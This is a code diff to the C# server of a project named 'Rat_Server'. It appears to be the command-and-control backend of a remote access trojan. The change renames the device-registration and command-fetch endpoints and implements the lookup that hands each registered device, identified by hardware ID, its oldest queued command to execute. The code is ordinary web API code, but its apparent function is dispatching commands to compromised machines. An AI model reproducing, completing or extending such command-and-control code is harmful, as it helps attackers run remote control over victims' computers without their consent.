@@ -19,7 +19,7 @@ namespace Rat_Server.Controllers
             _config = config;
         }
 
-        [HttpPost]
+        [HttpPost("RegisterDevice")]
         [ProducesResponseType(StatusCodes.Status201Created)]
         [ProducesResponseType(StatusCodes.Status400BadRequest)]
         [ProducesResponseType(StatusCodes.Status403Forbidden)]
@@ -53,11 +53,12 @@ namespace Rat_Server.Controllers
             return StatusCode(StatusCodes.Status201Created);
         }
 
-        [HttpGet]
+        [HttpGet("GetCurrentCommandForDevice")]
         [ProducesResponseType(typeof(CurrentCommandDto), StatusCodes.Status200OK)]
+        [ProducesResponseType(StatusCodes.Status204NoContent)]
         [ProducesResponseType(StatusCodes.Status400BadRequest)]
         [ProducesResponseType(StatusCodes.Status401Unauthorized)]
-        public ActionResult<CurrentCommandDto> GetCurrentCommandForDevice([FromHeader] string Hwid)
+        public ActionResult<CurrentCommandDto> GetCurrentCommandForDevice([FromHeader] Guid Hwid)
         {
             // If the client didn't provide a Hwid, send back a Bad Request status code
             if (!ModelState.IsValid)
@@ -66,13 +67,28 @@ namespace Rat_Server.Controllers
             }
 
             // If the client's Hwid isn't registered, send back an Unauthorized status code
-            if(_context.Devices.Find(new Guid(Hwid)) == null)
+            if(_context.Devices.Find(Hwid) == null)
             {
                 return StatusCode(StatusCodes.Status401Unauthorized);
             }
 
-            // TODO: Retrieve the current command that the device needs to execute
-            Command currentCommand;
+            // Retrieve the list of commands for the device and order them by the date they were added
+            List<Command> commands = _context.Commands.Where(c => c.Device.Hwid == Hwid).OrderBy(c => c.DateAdded).ToList();
+            
+            if(commands.Any())
+            {
+                // The first element of the list is the current command the device needs to execute
+                Command command = commands.First();
+
+                return Ok(new CurrentCommandDto {
+                    commandId = command.commandId.ToString(),
+                    CommandValue = command.CommandValue
+                });
+            }
+            else
+            {
+                return NoContent();
+            }
         }
     }
 }
